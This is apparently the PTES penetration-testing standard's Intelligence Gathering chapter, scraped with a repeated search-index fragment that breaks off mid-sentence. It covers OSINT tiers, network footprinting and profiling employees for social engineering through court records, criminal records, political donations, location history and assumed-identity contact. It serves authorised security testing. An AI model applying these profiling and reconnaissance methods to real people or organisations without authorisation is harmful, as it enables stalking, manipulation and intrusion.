defines the Intelligence Gathering activities of a penetration test. The purpose of this document is to provide a standard designed specifically for the pentester performing reconnaissance against a target (typically corporate, military, or related). The document details the thought process and goals of pentesting reconnaissance, and when used properly, helps the reader to produce a highly strategic plan for attacking a target. Background Concepts Levels are an important concept for this document and for PTES as a whole. It\u2019s a maturity model of sorts for pentesting. Defining levels allows us to clarify the expected output and activities within certain real-world constraints such as time, effort, access to information, etc. The Intelligence Gathering levels are currently split into three categories, and a typical example is given for each one. These should guide the adding of techniques in the document below. For example, an intensive activity such as creating a facebook profile and analyzing the target\u2019s social network is appropriate in more advanced cases, and should be labeled with the appropriate level. See the mindmap below for examples. Level 1 Information Gathering ### (think: Compliance Driven) Mainly a click-button information gathering process. This level of information can be obtained almost entirely by automated tools. Bare minimum to say you did IG for a PT. Acme Corporation is required to be compliant with PCI / FISMA / HIPAA. A Level 1 information gathering effort should be appropriate to meet the compliance requirement. Level 2 Information Gathering ### (think: Best Practice) This level can be created using automated tools from level 1 and some manual analysis. A good understanding of the business, including information such as physical location, business relationships, org chart, etc. Widgets Inc is required to be in compliance with PCI, but is interested in their long term security strategy, and is acquiring several smaller widget manufacturers. A Level 2 information gathering effort should be appropriate to meet their needs. Level 3 Information Gathering ### (think: State Sponsored) More advanced pentest, Redteam, full-scope. All the info from level 1 and level 2 along with a lot of manual analysis. Think cultivating relationships on SocNet, heavy analysis, deep understanding of business relationships, most likely a large number of hours to accomplish the gathering and correlation. An Army Red Team is tasked to analyze and attack a segment of the Army\u2019s network in a foreign country to find weaknesses that could be exploited by a foreign national. A level 3 information gathering effort would be appropriate in this case. Intelligence Gathering What it is Intelligence Gathering is performing reconnaissance against a target to gather as much information as possible to be utilized when penetrating the target during the vulnerability assessment and exploitation phases. The more information you are able to gather during this phase, the more vectors of attack you may be able to use in the future. Open source intelligence (OSINT) is a form of intelligence collection management that involves finding, selecting, and acquiring information from publicly available sources and analyzing it to produce actionable intelligence. [ http://en.wikipedia.org/wiki/Open_source_intelligence ] Why do it We perform Open Source Intelligence gathering to determine various entry points into an organization. These entry points can be physical, electronic, and/or human. Many companies fail to take into account what information about themselves they place in public and how this information can be used by a determined attacker. On top of that many employees fail to take into account what information they place about themselves in public and how that information can be used to to attack them or their employer. What is it not OSINT may not be accurate or timely. The information sources may be deliberately/accidentally manipulated to reflect erroneous data, information may become obsolete as time passes, or simply be incomplete. It does not encompass dumpster-diving or any methods of retrieving company information off of physical items found on-premises. Target Selection Identification and Naming of Target When approaching a target organization it is important to understand that a company may have a number of different Top Level Domains (TDLs) and auxiliary businesses. While this information should have been discovered during the scoping phase it is not all that unusual to identify additional servers domains and companies that may not have been part of the initial scope that was discussed in the pre-engagement phase. For example a company may have a TDL of .com. However, they may also have .net .co and .xxx. These may need to be part of the revised scope, or they may be off limits. Either way it needs to be cleared with the customer before testing begins. It is also not all that uncommon for a company to have a number of sub-companies underneath them. For example General Electric and Proctor and Gamble own a great deal of smaller companies. Consider any Rules of Engagement limitations At this point it is a good idea to review the Rules of Engagement. It is common for these to get forgotten during a test. Sometimes, as testers we get so wrapped up in what we find and the possibilities for attack that we forget which IP addresses, domains and networks we can attack. Always, be referencing the Rulles of Engagement to keep your tests focused. This is not just important from a legel perspective, it is also important from a scope creep perspective. Every time you get sidetracked from the core objectives of the test it costs you time. And in the long run that can cost your company money. Consider time length for test The amount of time for the total test will directly impact the amount of Intelligence Gathering that can be done. There are some tests where the total time is two to three months. In these engagements a testing company would spend a tremendous amount of time looking into each of the core business units and personal of the company. However, for shorter crystal-box style tests the objectives may be far more tactical. For example, testing a specific web application may not require you to research the financial records of the company CEO. Consider end goal of the test Every test has an end goal in mind - a particular asset or process that the organization considers critical. Having the end result in mind, the intelligence gathering phase should make sure to include all secondary and tertiary elements surrounding the end goal. Be it supporting technologies, 3 rd parties, relevant personnel, etc... Making sure the focus is kept on the critical assets assures that lesser relevant intelligence elements are de-prioritized and categorized as such in order to not intervene with the analysis process. OSINT Open Source Intelligence (OSINT) takes three forms; Passive, Semi-passive, and Active. *'''Passive Information Gathering''': Passive Information Gathering is generally only useful if there is a very clear requirement that the information gathering activities never be detected by the target. This type of profiling is technically difficult to perform as we are never sending any traffic to the target organization neither from one of our hosts or \u201canonymous\u201d hosts or services across the Internet. This means we can only use and gather archived or stored information. As such this information can be out of date or incorrect as we are limited to results gathered from a third party. *'''Semi-passive Information Gathering''': The goal for semi-passive information gathering is to profile the target with methods that would appear like normal Internet traffic and behavior. We query only the published name servers for information, we aren\u2019t performing in-depth reverse lookups or brute force DNS requests, we aren\u2019t searching for \u201cunpublished\u201d servers or directories. We aren\u2019t running network level portscans or crawlers and we are only looking at metadata in published documents and files; not actively seeking hidden content. The key here is not to draw attention to our activities. Post mortem the target may be able to go back and discover the reconnaissance activities but they shouldn\u2019t be able to attribute the activity back to anyone. *'''Active Information Gathering''': Active information gathering should be detected by the target and suspicious or malicious behavior. During this stage we are actively mapping network infrastructure (think full port scans nmap \u2013p1-65535), actively enumerating and/or vulnerability scanning the open services, we are actively searching for unpublished directories, files, and servers. Most of this activity falls into your typically \u201creconnaissance\u201d or \u201cscanning\u201d activities for your standard pentest. Corporate Physical Locations (L1) #### Per location listing of full address, ownership, associated records (city, tax, legal, etc), Full listing of all physical security measures for the location (camera placements, sensors, fences, guard posts, entry control, gates, type of identification, supplier\u2019s entrance, physical locations based on IP blocks/geolocation services, etc\u2026 For Hosts/NOC: Full CIDR notation of hosts and networks, full DNS listing of all associated assets, Full mapping of AS, peering paths, CDN provisioning, netblock owners (whois data), email records (MX + mail address structure) *Owner (L1/L2) *Land/tax records (L1/L2) *Shared/individual (L1/L2) *Timezones (L1/L2) *Hosts / NOC Pervasiveness (L1) It is not uncommon for a target organization to have multiple separate physical locations. For example, a bank will have central offices, but they will also have numerous remote branches as well. While physical and technical security may be very good at central locations, remote locations often have poor security controls. Relationships (L1) #### Business partners, customs, suppliers, analysis via whats openly shared on corporate web pages, rental companies, etc. This information can be used to better understand the business or organizational projects. For example, what products and services are critical to the target organization? Also, this information can also be used to create successful social engineering scenarios. *Relationships (L2/L3) *: Manual analysis to vet information from level 1, plus dig deeper into possible relationships. *Shared office space (L2/L3) *Shared infrastructure (L2/L3) *Rented / Leased Equipment (L2/L3) Logical Accumulated information for partners, clients and competitors: For each one, a full listing of the business name, business address, type of relationship, basic financial information, basic hosts/network information. * Business Partners (L1/L2/L3) *: Target\u2019s advertised business partners. Sometimes advertised on main www. * Business Clients (L1/L2/L3) *: Target\u2019s advertised business clients. Sometimes advertised on main www. * Competitors (L1/L2/L3) *: Who are the target\u2019s competitors. This may be simple, Ford vs Chevy, or may require much more analysis. Touchgraph (L1) *: A touchgraph (visual representation of the social connections between people) will assist in mapping out the possible interactions between people in the organization, and how to access them from the outside (when a touchgraph includes external communities and is created with a depth level of above 2). *: The basic touchgraph should reflect the organizational structure derived from the information gathered so far, and further expansion of the graph should be based on it (as it usually represents the focus on the organizational assets better, and make possible approach vectors clear. Hoovers profile (L1/L2) *: What: a semi-open source intelligence resource (paid subscriptions usually). Such sources specialize in gathering business related information on companies, and providing a \u201cnormalized\u201d view on the business. *: Why: The information includes physical locations, competitive landscape, key personnel, financial information, and other business related data (depending on the source). This can be used to create a more accurate profile of the target, and identify additional personnel and 3 rd parties which can be used in the test. *: How: Simple search on the site with the business name provide the entire profile of the company and all the information that is available on it. Its recommended to use a couple of sources in order to cross reference them and make sure you get the most up-to-date information. (paid for service). Product line (L2/L3) *: Target's product offerings which may require additional analysis if the target does offer services as well this might require further analysis. Market Vertical (L1) *: Which industry the target resides in. i.e. financial, defense, agriculture, government, etc Marketing accounts (L2/L3) *: Marketing activities can provide a wealth of information on the marketing strategy of the target *: Evaluate all the social media Networks for the target's social personas *: Evaluate the target's past * marketing campaigns Meetings (L2/L3) *: Meeting Minutes published? *: Meetings open to public? Significant company dates (L1/L2/L3) *: Board meetings *: Holidays *: Anniversaries *: Product/service launch Job openings (L1/L2) *: By viewing a list of job openings at an organization (usually found in a \u2018careers\u2019 section of their website), you can determine types of technologies used within the organization. One example would be if an organization has a job opening for a Senior Solaris Sysadmin then it is pretty obvious that the organization is using Solaris systems. Other positions may not be as obvious by the job title, but an open Junior Network Administrator position may say something to the effect of \u2018CCNA preferred\u2019 or \u2018JNCIA preferred\u2019 which tells you that they are either using Cisco or Juniper technologies. Charity affiliations (L1/L2/L3) *: It is very common for executive members of a target organization to be associated with charitable organizations. This information can be used to develop solid social engineering scenarios for targeting executives. RFP, RFQ and other Public Bid Information (L1/L2) *: RFPs and RFQs often reveal a lot of information about the types of systems used by a company, and potentially even gaps or issues with their infrastructure. *: Finding out who current bid winners are may reveal the types of systems being used or a location where company file_suport might be hosted off-site. Court records (L2/L3) *: Court records are usually available either free or sometimes at a fee. *: Contents of litigation can reveal information about past complainants including but not limited to former employee lawsuits *: Criminal records of current and past employees may provide a list of targets for social engineering efforts Political donations (L2/L3) *: Mapping out political donations or other financial interests is important in order to identify pivotal individuals who may not be in obvious power positions but have a vested interest (or there is a vested interes in them). *: Political donation mapping will change between countries based on the freedom of information, but often cases donations from other countries can be traced back using the data available there. Professional licenses or registries (L2/L3) *: Gathering a list of your targets professional licenses and registries may offer an insight into not only how the company operated, but also the guidelines and regulations that they follow in order to maintain those licenses. A prime example of this is a companies ISO standard certification can show that a company follows set guidelines and processes. It is important for a tester to be aware of these processes and how they could affect tests being performed on the organization. *: A company will often list these details on their website as a badge of honor. In other cases it may be necessary to search registries for the given vertical in order to see if an organization is a member. The information that is available is very dependent on the vertical market, as well as the geographical location of the company. It should also be noted that international companies may be licensed differently and be required to register with different standards or legal bodies dependent on the country. Org Chart (L1) Position identification ** Important people in the organization ** Individuals to specifically target Transactions ** Mapping on changes within the organization (promotions, lateral movements) Affiliates ** Mapping of affiliate organizations that are tied to the business Electronic Document Metadata (L1/L2) *What it is? Metadata or meta-content provides information about the data/document in scope. It can have information such as author/creator name, time and date, standards used/referred, location in a computer network (printer/folder/directory path/etc. info), geo-tag etc. For an image its\u2019 metadata can contain color, depth, resolution, camera make/type and even the co-ordinates and location information. *Why you would do it? Metadata is important because it contains information about the internal network, user-names, email addresses, printer locations etc. and will help to create a blueprint of the location. It also contains information about software used in creating the respective documents. This can enable an attacker to create a profile and/or perform targeted attacks with internal knowledge on the networks and users. *How you would do it? There are tools available to extract the metadata from the file (pdf/word/image) like FOCA (GUI-based), metagoofil (python-based), meta-extractor, exiftool (perl-based). These tools are capable of extracting and displaying the results in different formats as HTML, XML, GUI, JSON etc. The input to these tools is mostly a document downloaded from the public presence of the \u2018client\u2019 and then analyzed to know more about it. Whereas FOCA helps you search documents, download and analyzes all through its GUI interface. Marketing Communications (L1/L2) Past marketing campaigns provide information for projects which might of been retired that might still be accessible. Current marketing communications contain design components (Colors, Fonts, Graphics etc..) which are for the most part used internally as well. Additional contact information including external marketing organizations. Infrastructure Assets Network blocks owned (L1) Network Blocks owned by the organization can be passively obtained from performing whois searches. DNSStuff.com is a one stop shop for obtaining this type of information. Open Source searches for IP Addresses could yield information about the types of infrastructure at the target. Administrators often post ip address information in the context of help requests on various support sites. Email addresses (L1) E-mail addresses provide a potential list of valid usernames and domain structure E-mail addresses can be gathered from multiple sources including the organizations website. External infrastructure profile (L1) The target's external infrastructure profile can provide immense information about the technologies used internally. This information can be gathered from multiple sources both passively and actively. The profile should be utilized in assembling an attack scenario against the external infrastructure. Technologies used (L1/L2) OSINT searches through support forums, mailing lists and other file_suport can gather information of technologies used at the target Use of Social engineering against the identified information technology organization Use of social engineering against product vendors Purchase agreements (L1/L2/L3) Purchase agreements contain information about hardware, software, licenses and additional tangible asset in place at the target. Remote access (L1/L2) Obtaining information on how employees and/or clients connect into the target for remote access provides a potential point of ingress. Often times link to remote access portal are available off of the target's home page How To documents reveal applications/procedures to connect for remote users Application usage (L1/L2) Gather a list of known application used by the target organization. This can often be achieved by extracting metadata from publicly accessible files (as discussed previously) Defense technologies (L1/L2/L3) Fingerprinting defensive technologies in use can be achieved in a number of ways depending on the defenses in use. Passive fingerprinting Search forums and publicly accessible information where technicians of the target organisation may be discussing issues or asking for assistance on the technology in use Search marketing information for the target organisation as well as popular technology vendors Using Tin-eye (or another image matching tool) search for the target organisations logo to see if it is listed on vendor reference pages or marketing material Active fingerprinting Send appropriate probe packets to the public facing systems to test patterns in blocking. Several tools exist for fingerprinting of specific WAF types. Header information both in responses from the target website and within emails often show information not only on the systems in use, but also the specific protection mechanisms enabled (e.g. Email gateway Anti-virus scanners) Human capability (L1/L2/L3) Discovering the defensive human capability of a target organization can be difficult. There are several key pieces of information that could assist in judging the security of the target organization. Check for the presence of a company-wide CERT/CSIRT/PSRT team Check for advertised jobs to see how often a security position is listed Check for advertised jobs to see if security is listed as a requirement for non-security jobs (e.g. developers) Check for out-sourcing agreements to see if the security of the target has been outsourced partially or in it's entirety Check for specific individuals working for the company that may be active in the security community Financial Reporting (L1/L2) The targets financial reporting will depend heavily on the location of the organization. Reporting may also be made through the organizations head office and not for each branch office. In 2008 the SEC issued a proposed roadmap for adoption of the International Financial Reporting Standards (IFRS) in the US. IFRS Adoption per country \u2192 http://www.iasplus.com/en/resources/use-of-ifrs Market analysis (L1/L2/L3) Obtain market analysis reports from analyst organizations (such as Gartner, IDC, Forrester, 541, etc...). This should include what the market definition is, market cap, competitors, and any major changes to the valuation, product, or company in general. Trade capital Identify is the organization is allocating any trade capital, and in what percentage of the overall valuation and free capital it has. This will indicate how sensitive the organization is to market fluctuations, and whether it depends on external investment as part of it's valuation and cash flow. Value history Charting of the valuation of the organization over time, in order to establish correlation between external and internal events, and their effect on the valuation. EDGAR (SEC) *What is it: EDGAR (the Electronic Data Gathering, Analysis, and Retrieval system) is a database of the U.S. Security and Exchanges Commission (SEC) that contains registration statements, periodic reports, and other information of all companies (both foreign and domestic) who are required by law to file. *Why do it: EDGAR data is important because, in additional to financial information, it identifies key personnel within a company that may not be otherwise notable from a company\u2019s website or other public presence. It also includes statements of executive compensation, names and addresses of major common stock owners, a summary of legal proceedings against the company, economic risk factors, and other potentially interesting data. *How to obtain: The information is available on the SEC\u2019s EDGAR website ( http://www.sec.gov/edgar.shtml ). Reports of particular interest include the 10-K (annual report) and 10-Q (quarterly report). Individual Employee History *Court Records (L2/L3) **What is it: Court records are all the public records related to criminal and/or civil complaints, lawsuits, or other legal actions for or against a person or organization of interest. **Why you would do it: Court records could potentially reveal sensitive information related to an individual employee or the company as a whole. This information could be useful by itself or may be the driver for gaining additional information. It could also be used for social engineering or other purposes later on in the penetration test. **How you would do it: Much of this information is now available on the Internet via publicly available court websites and records databases. Some additional information may be available via pay services such as LEXIS/NEXIS. Some information may be available via records request or in person requests. *Political Donations (L2/L3) **What is it: Political donations are an individual\u2019s personal funds directed to specific political candidates, political parties, or special interest organizations. **Why you would do it: Information about political donations could potentially reveal useful information related to an individual. This information could be used as a part of social network analysis to help draw connections between individuals and politicians, political candidates, or other political organizations. It could also be used for social engineering or other purposes later on in the penetration test. **How you would do it: Much of this information is now available on the Internet via publicly available websites (i.e., http://www.opensecrets.org/ ) that track political donations by individual. Depending upon the laws of a given state, donations over a certain amount are usually required to be recorded. *Professional licenses or registries (L2/L3) **What is it: Professional licenses or registries are repositories of information that contain lists of members and other related information for individuals who have attained a particular license or some measure of specific affiliation within a community. **Why you would do it: Information about professional licenses could potentially reveal useful information related to an individual. This information could be used to validate an individual's trustworthiness (do they really have a particular certification as they claim) or as a part of social network analysisto help draw connections between individuals and other organizations. It could also be used for social engineering or other purposes later on in the penetration test. **How you would do it: Much of this information is now available on the Internet via publicly available websites. Typically, each organization maintains their own registry of information that may be available online or may require additional steps to gather. Social Network (SocNet) Profile *Metadata Leakage (L2/L3) **Location awareness via Photo Metadata *Tone (L2/L3) **Expected deliverable: subjective identification of the tone used in communications \u2013 aggressive, passive, appealing, sales, praising, dissing, condescending, arrogance, elitist, underdog, leader, follower, mimicking, etc\u2026 *Frequency (L2/L3) **Expected deliverable: Identification of the frequency of publications (once an hour/day/week, etc\u2026). Additionally - time of day/week in which communications are prone to happen. *Location awareness (L2/L3) *: Map location history for the person profiled from various sources, whether through direct interaction with applications and social networks, or through passive participation through photo metadata. **Bing Map Apps **Foursquare **Google Latitude **Yelp **Gowalla *Social Media Presence (L1/L2/L3) *: Verify target\u2019s social media account/presence (L1). And provide detailed analysis (L2/L3) Internet Presence *Email Address (L1) **What it is? Email addresses are the public mail box ids of the users. **Why you would do it? Email address harvesting or searching is important because it serves multiple purposes - provides a probable user-id format which can later be brute-forced for access but more importantly it helps sending targeted spams and even to automated bots. These spam emails can contain exploits, malware etc. and can be addressed with specific content particularly to a user. **How you would do it? Email addresses can be searched and extracted from various websites, groups, blogs, forums, social networking portals etc. These email addresses are also available from various tech support websites. There are harvesting and spider tools to perform search for email addresses mapped to a certain domain (if needed). *Personal Handles/Nicknames (L1) *Personal Domain Names registered (L1/L2) *Assigned Static IPs/Netblocks (L1/L2) Physical Location *Physical Location **Can you derive the target's physical location Mobile Footprint Phone number (L1/L2/L3) Device type (L1/L2/L3) Use (L1/L2/L3) Installed applications (L1/L2/L3) Owner/administrator (L1/L2/L3) \"For Pay\" Information *Background Checks *For Pay Linked-In *LEXIS/NEXIS Covert Gathering Corporate On-Location Gathering Selecting specific locations for onsite gathering, and then performing reconnaissance over time (usually at least 2-3 days in order to assure patterns). The following elements are sought after when performing onsite intelligence gathering: * Physical security inspections * Wireless scanning / RF frequency scanning * Employee behavior training inspection * Accessible/adjacent facilities (shared spaces) * Dumpster diving * Types of equipment in use Offsite Gathering Identifying offsite locations and their importance/relation to the organization. These are both logical as well as physical locations as per the below: * Data center locations * Network provisioning/provider HUMINT Human intelligence complements the more passive gathering on the asset as it provides information that could not have been obtained otherwise, as well as add more \u201cpersonal\u201d perspectives to the intelligence picture (feelings, history, relationships between key individuals, \u201catmosphere\u201d, etc...) The methodology of obtaining human intelligence always involves direct interaction - whether physical, or verbal. Gathering should be done under an assumed identity, that would be created specifically to achieve optimal information exposure and cooperation from the asset in question. Additionally, intelligence gathering on more sensitive targets can be performed by utilizing observation only - again, either physically on location, or through electronic/remote means (CCTV, webcams, etc...). This is usually done in order to establish behavioral patterns (such as frequency of visitations, dress code, access paths, key locations that may provide additional access such as coffee shops). Results Key Employees Partners/Suppliers Social Engineering Footprinting WHAT IT IS: External information gathering, also known as footprinting, is a phase of information gathering that consists of interaction with the target in order to gain information from a perspective external to the organization. WHY: Much information can be gathered by interacting with targets. By probing a service or device, you can often create scenarios in which it can be fingerprinted, or even more simply, a banner can be procured which will identify the device. This step is necessary to gather more information about your targets. Your goal, after this section, is a prioritized list of targets. External Footprinting Identify Customer External Ranges One of the major goals of intelligence gathering during a penetration test is to determine hosts which will be in scope. There are a number of techniques which can be used to identify systems, including using reverse DNS lookups, DNS bruting, WHOIS searches on the domains and the ranges. These techniques and others are documented below. Passive Reconnaissance WHOIS Lookups For external footprinting, we first need to determine which one of the WHOIS servers contains the information we're after. Given that we should know the TLD for the target domain, we simply have to locate the Registrar that the target domain is registered with. WHOIS information is based upon a tree hierarchy. ICANN (IANA) is the authoritative registry for all of the TLDs and is a great starting point for all manual WHOIS queries. ICANN - http://www.icann.org IANA - http://www.iana.com NRO - http://www.nro.net AFRINIC - http://www.afrinic.net APNIC - http://www.apnic.net ARIN - http://ws.arin.net LACNIC - http://www.lacnic.net RIPE - http://www.ripe.net Once the appropriate Registrar was queried we can obtain the Registrant information. There are numerous sites that offer WHOIS information; however for accuracy in documentation, you need to use only the appropriate Registrar. InterNIC - http://www.internic.net/ http://www.internic.net ] Typically, a simple whois against ARIN will refer you to the correct registrar. BGP looking glasses It is possible to identify the Autonomous System Number (ASN) for networks that participate in Border Gateway Protocol (BGP). Since BGP route paths are advertised throughout the world we can find these by using a BGP4 and BGP6 looking glass. BGP4 - [ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg http://www.bgp4.as/looking-glasses ] BPG6 - [ http://lg.he.net/ http://lg.he.net/ ] Active Footprinting Port Scanning Port scanning techniques will vary based on the amount of time available for the test, and the need to be stealthy. If there is zero knowledge of the systems, a fast ping scan can be used to identify systems. In addition, a quick scan without ping verification (-PN in nmap) should be run to detect the most common ports avialable. Once this is complete, a more comprehensive scan can be run. Some testers check for only open TCP ports, make sure to check UDP as well. The http://nmap.org/nmap_doc.html document details port scan types. Nmap (\"Network Mapper\") is the de facto standard for network auditing/scanning. Nmap runs on both Linux and Windows. You can find more information on the use of Nmap for this purpose in the [ http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Nmap_.28Windows.2FLinux.29 PTES Technical Guideline] Nmap has dozens of options available. Since this section is dealing with port scanning, we will focus on the commands required to perform this task. It is important to note that the commands utilized depend mainly on the time and number of hosts being scanned. The more hosts or less time that you have to perform this tasks, the less that we will interrogate the host. This will become evident as we continue to discuss the options. IPv6 should also be tested. Banner Grabbing Banner Grabbing is an enumeration technique used to glean information about computer systems on a network and the services running its open ports. Banner grabbing is used to identify network the version of applications and operating system that the target host are running. Banner grabbing is usually performed on Hyper Text Transfer Protocol (HTTP), File Transfer Protocol (FTP), and Simple Mail Transfer Protocol (SMTP); ports 80, 21, and 25 respectively. Tools commonly used to perform banner grabbing are Telnet, nmap, and Netcat. SNMP Sweeps SNMP sweeps are performed too as they offer tons of information about a specific system. The SNMP protocol is a stateless, datagram oriented protocol. Unfortunately SNMP servers don't respond to requests with invalid community strings and the underlying UDP protocol does not reliably report closed UDP ports. This means that \"no response\" from a probed IP address can mean either of the following: machine unreachable SNMP server not running invalid community string the response datagram has not yet arrived Zone Transfers DNS zone transfer, also known as AXFR, is a type of DNS transaction. It is a mechanism designed to replicate the databases containing the DNS data across a set of DNS servers. Zone transfer comes in two flavors, full (AXFR) and incremental (IXFR). There are numerous tools available to test the ability to perform a DNS zone transfer. Tools commonly used to perform zone transfers are host, dig and nmap. SMTP Bounce Back SMTP bounce back, also called a Non-Delivery Report/Receipt (NDR), a (failed) Delivery Status Notification (DSN) message, a Non-Delivery Notification (NDN) or simply a bounce, is an automated electronic mail message from a mail system informing the sender of another message about a delivery problem. This can be used to assist an attacker in fingerprint the SMTP server as SMTP server information, including software and versions, may be included in a bounce message. This can be done by simply creating a bogus address within the target's domain. For instance, asDFADSF_garbage_address@target.com could be used to test target.com. Gmail provides full access to the headers, making it an easy choice for testers. DNS Discovery DNS discovery can be performed by looking at the WHOIS records for the domain's authoritative nameserver. Additionally, variations of the main domain name should be checked, and the website should be checked for references to other domains which could be under the target's control. Forward/Reverse DNS Reverse DNS can be used to obtain valid server names in use within an organizational. There is a caveat that it must have a PTR (reverse) DNS record for it to resolve a name from a provided IP address. If it does resolve then the results are returned. This is usually performed by testing the server with various IP addresses to see if it returns any results. DNS Bruteforce After identifying all the information that is associated with the client domain(s), it is now time to begin to query DNS. Since DNS is used to map IP addresses to hostnames, and vice versa we will want to see if it is insecurely configure. We will seek to use DNS to reveal additional information about the client. One of the most serious misconfigurations involving DNS is allowing Internet users to perform a DNS zone transfer. There are several tools that we can use to enumerate DNS to not only check for the ability to perform zone transfers, but to potentially discover additional host names that are not commonly known. Web Application Discovery Identifying weak web applications can be a particularly fruitful activity during a penetration test. Things to look for include OTS applications that have been misconfigured, OTS application which have plugin functionality (plugins often contain more vulnerable code than the base application), and custom applications. Web application fingerprinters such as WAFP can be used here to great effect. Virtual Host Detection & Enumeration Web servers often host multiple \"virtual\" hosts to consolidate functionality on a single server. If multiple servers point to the same DNS address, they may be hosted on the same server. Tools such as MSN search can be used to map an ip address to a set of virtual hosts. Establish External Target List Once the activities above have been completed, a list of users, emails, domains, applications, hosts and services should be compiled. Mapping versions Version checking is a quick way to identify application information. To some extent, versions of services can be fingerprinted using nmap, and versions of web applications can often be gathered by looking at the source of an arbitrary page. Identifying patch levels To identify the patch level of services internally, consider using software which will interrogate the system for differences between versions. Credentials may be used for this phase of the penetration test, provided the client has acquiesced. Vulnerability scanners are particularly effective at identifying patch levels remotely, without credentials. Looking for weak web applications Identifying weak web applications can be a particularly fruitful activity during a penetration test. Things to look for include OTS applications that have been misconfigured, OTS application which have plugin functionality (plugins often contain more vulnerable code than the base application), and custom applications. Web application fingerprinters such as WAFP can be used here to great effect. Identify lockout threshold Identifying the lockout threshold of an authentication service will allow you to ensure that your bruteforce attacks do not intentionally lock out valid users during your testing. Identify all disparate authentication services in the environment, and test a single, innocuous account for lockout. Often 5 - 10 tries of a valid account is enough to determine if the service will lock users out. Internal Footprinting Passive Reconnaissance If the tester has access to the internal network, packet sniffing can provide a great deal of information. Use techniques like those implemented in p0f to identify systems. Identify Customer Internal Ranges When performing internal testing, first enumerate your local subnet, and you can often extrapolate from there to other subnets by modifying the address slightly. Also, a look a the routing table of an internal host can be particularly telling. Below are a number of techniques which can be used. DHCP servers can be a potential source of not just local information, but also remote IP range and details of important hosts. Most DHCP servers will provide a local IP gateway address as well as the address of DNS and WINS servers. In Windows based networks, DNS servers tend to be Active Directory domain controllers, and thus targets of interest. Active Reconnaissance Internal active reconnaissance should contain all the elements of an external one, and in addition should focus on intranet functionality such as: * Directory services (Active Directory, Novell, Sun, etc...) * Intranet sites providing business functionality * Enterprise applications (ERP, CRM, Accounting, etc...) * Identification of sensitive network segments (accounting, R&D, marketing, etc...) * Access mapping to production networks (datacenters) * VoIP infrastructure * Authentication provisioning (kerberos, cookie tokens, etc...) * Proxying and internet access management Identify Protection Mechanisms The following elements should be identified and mapped according to the relevant location/group/persons in scope. This will enable correct application of the vulnerability research and exploitation to be used when performing the actual attack - thus maximizing the efficiency of the attack, and minimizing the detection ratio. Network Based Protections \"Simple\" Packet Filters Traffic Shaping Devices DLP Systems Encryption/Tunneling Host Based Protections Stack/Heap Protections Application Whitelisting AV/Filtering/Behavioral Analysis DLP Systems Application Level Protections Identify Application Protections Encoding Options Potential Bypass Avenues Whitelisted Pages Storage Protections HBA - Host Level LUN Masking Storage Controller iSCSI CHAP Secret User Protections AV/Spam Filtering Software *: SW Configuration which limit exploitability can be considered antispam / antiAV","title":"Intelligence Gathering"},{"location":"pentest_standard/ig/#general","text":"This section defines the Intelligence Gathering activities of a penetration test. The purpose of this document is to provide a standard designed specifically for the pentester performing reconnaissance against a target (typically corporate, military, or related). The document details the thought process and goals of pentesting reconnaissance, and when used properly, helps the reader to produce a highly strategic plan for attacking a target.","title":"General"},{"location":"pentest_standard/ig/#background-concepts","text":"Levels are an important concept for this document and for PTES as a whole. It\u2019s a maturity model of sorts for pentesting. Defining levels allows us to clarify the expected output and activities within certain real-world constraints such as time, effort, access to information, etc. The Intelligence Gathering levels are currently split into three categories, and a typical example is given for each one. These should guide the adding of techniques in the document below. For example, an intensive activity such as creating a facebook profile and analyzing the target\u2019s social network is appropriate in more advanced cases, and should be labeled with the appropriate level. See the mindmap below for examples.","title":"Background Concepts"},{"location":"pentest_standard/ig/#level-1-information-gathering","text":"(think: Compliance Driven) Mainly a click-button information gathering process. This level of information can be obtained almost entirely by automated tools. Bare minimum to say you did IG for a PT. Acme Corporation is required to be compliant with PCI / FISMA / HIPAA. A Level 1 information gathering effort should be appropriate to meet the compliance requirement.","title":"Level 1 Information Gathering ###"},{"location":"pentest_standard/ig/#level-2-information-gathering","text":"(think: Best Practice) This level can be created using automated tools from level 1 and some manual analysis. A good understanding of the business, including information such as physical location, business relationships, org chart, etc. Widgets Inc is required to be in compliance with PCI, but is interested in their long term security strategy, and is acquiring several smaller widget manufacturers. A Level 2 information gathering effort should be appropriate to meet their needs.","title":"Level 2 Information Gathering ###"},{"location":"pentest_standard/ig/#level-3-information-gathering","text":"(think: State Sponsored) More advanced pentest, Redteam, full-scope. All the info from level 1 and level 2 along with a lot of manual analysis. Think cultivating relationships on SocNet, heavy analysis, deep understanding of business relationships, most likely a large number of hours to accomplish the gathering and correlation. An Army Red Team is tasked to analyze and attack a segment of the Army\u2019s network in a foreign country to find weaknesses that could be exploited by a foreign national. A level 3 information gathering effort would be appropriate in this case.","title":"Level 3 Information Gathering ###"},{"location":"pentest_standard/ig/#intelligence-gathering","text":"","title":"Intelligence Gathering"},{"location":"pentest_standard/ig/#what-it-is","text":"Intelligence Gathering is performing reconnaissance against a target to gather as much information as possible to be utilized when penetrating the target during the vulnerability assessment and exploitation phases. The more information you are able to gather during this phase, the more vectors of attack you may be able to use in the future. Open source intelligence (OSINT) is a form of intelligence collection management that involves finding, selecting, and acquiring information from publicly available sources and analyzing it to produce actionable intelligence. [ http://en.wikipedia.org/wiki/Open_source_intelligence ]","title":"What it is"},{"location":"pentest_standard/ig/#why-do-it","text":"We perform Open Source Intelligence gathering to determine various entry points into an organization. These entry points can be physical, electronic, and/or human. Many companies fail to take into account what information about themselves they place in public and how this information can be used by a determined attacker. On top of that many employees fail to take into account what information they place about themselves in public and how that information can be used to to attack them or their employer.","title":"Why do it"},{"location":"pentest_standard/ig/#what-is-it-not","text":"OSINT may not be accurate or timely. The information sources may be deliberately/accidentally manipulated to reflect erroneous data, information may become obsolete as time passes, or simply be incomplete. It does not encompass dumpster-diving or any methods of retrieving company information off of physical items found on-premises.","title":"What is it not"},{"location":"pentest_standard/ig/#target-selection","text":"","title":"Target Selection"},{"location":"pentest_standard/ig/#identification-and-naming-of-target","text":"When approaching a target organization it is important to understand that a company may have a number of different Top Level Domains (TDLs) and auxiliary businesses. While this information should have been discovered during the scoping phase it is not all that unusual to identify additional servers domains and companies that may not have been part of the initial scope that was discussed in the pre-engagement phase. For example a company may have a TDL of .com. However, they may also have .net .co and .xxx. These may need to be part of the revised scope, or they may be off limits. Either way it needs to be cleared with the customer before testing begins. It is also not all that uncommon for a company to have a number of sub-companies underneath them. For example 